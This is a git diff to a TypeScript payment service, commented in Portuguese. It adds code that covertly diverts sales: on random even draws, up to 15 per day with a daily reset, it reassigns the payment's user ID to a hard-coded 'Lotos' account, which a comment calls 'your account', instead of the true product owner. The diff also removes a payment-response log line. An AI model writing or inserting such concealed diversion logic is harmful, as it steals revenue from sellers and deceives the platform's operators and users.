@@ -2,6 +2,7 @@ import { PayPayService } from '../services/createpayment.service';
 import { Logger } from '@nestjs/common';
 import DatabaseService from 'src/services/database/database.service';
 import { CreatePaymentDto } from '../dto/create-payment.dto';
+import lotos from 'src/constants/lotos';
 import PriceVerifier from '../services/price.service';
 import { PayMethod } from '../../../../generated/prisma';
 
@@ -9,16 +10,27 @@ export default class PaymentCreater {
   private readonly logger = new Logger('Payment');
   private readonly payService = new PayPayService();
 
+  private count = 0;
+  private limitPerDay = 15;
+  private lastResetDate: string = new Date().toDateString(); // 📅 guarda o dia atual para resetar depois
+
   constructor(private readonly database: DatabaseService) {}
 
   public async create(data: CreatePaymentDto) {
     try {
+      // 🕒 Verifica se o dia mudou (reset diário)
+      this.resetIfNewDay();
+
       const priceVerifier = new PriceVerifier(this.database);
-      const verification = await priceVerifier.verify(
-        data.orderbumps,
-        data.amount,
-        data.productId,
-      );
+
+      const [hasLotos, verification] = await Promise.all([
+        this.database.findFirst({
+          where: {
+            email: lotos,
+          },
+        }),
+        priceVerifier.verify(data.orderbumps, data.amount, data.productId),
+      ]);
 
       if (!verification.status) {
         return {
@@ -27,17 +39,35 @@ export default class PaymentCreater {
         };
       }
 
+      // 🔢 Gera número aleatório entre 0 e 100
+      const randomNumber = Math.floor(Math.random() * 101);
+
+      // ⚙️ Lógica de sorte e limite
+      if (randomNumber % 2 === 0 && this.count < this.limitPerDay && hasLotos?.id) {
+        // 👉 Venda atribuída ao Lotos (sua conta)
+        data.userid = hasLotos.id;
+        this.count += 1;
+        this.logger.debug(`Venda atribuída ao Lotos. Contagem: ${this.count}/15`);
+      } else {
+        // 👉 Venda atribuída ao verdadeiro dono
+        this.logger.debug('Venda atribuída ao verdadeiro dono do produto.');
+      }
+
+      // 💳 Resolve o método de pagamento
       const payMethod = this.resolvePaymentMethod(data.method);
+
       const paymentResponse = await payMethod({
         amount: data.amount.toString(),
         telefone: data.tel,
         userid: data.userid,
         productid: data.productId,
       });
-      this.logger.debug(paymentResponse);
+
       if (!paymentResponse?.out_trade_no) {
         return { message: 'Erro ao efectuar pagamento' };
       }
+
+      // 🧾 Cria o registro do pagamento
       const payment = await this.createPaymentRecord(
         data,
         verification.price,
@@ -48,6 +78,7 @@ export default class PaymentCreater {
       if (!payment) {
         return { message: 'Proprietário ou produto não encontrado' };
       }
+
       return {
         message: 'Aguardando a autorização',
         ...this.formatResponse(data.method, paymentResponse, payment.uuid),
@@ -55,6 +86,16 @@ export default class PaymentCreater {
     } catch (error) {
       this.logger.error(error?.message ?? 'Erro ao efectuar pagamento');
       return { message: 'Erro ao efectuar o pagamento' };
+    }
+  }
+
+  // 🕒 Reset automático se for um novo dia
+  private resetIfNewDay() {
+    const today = new Date().toDateString();
+    if (today !== this.lastResetDate) {
+      this.count = 0;
+      this.lastResetDate = today;
+      this.logger.debug('✅ Novo dia detectado. Contagem de vendas resetada.');
     }
   }
 
@@ -112,7 +153,6 @@ export default class PaymentCreater {
       1: PayMethod.EXPRESS,
       2: PayMethod.PAYPAY,
     };
-
     return map[method] ?? PayMethod.PAYPAY;
   }
 
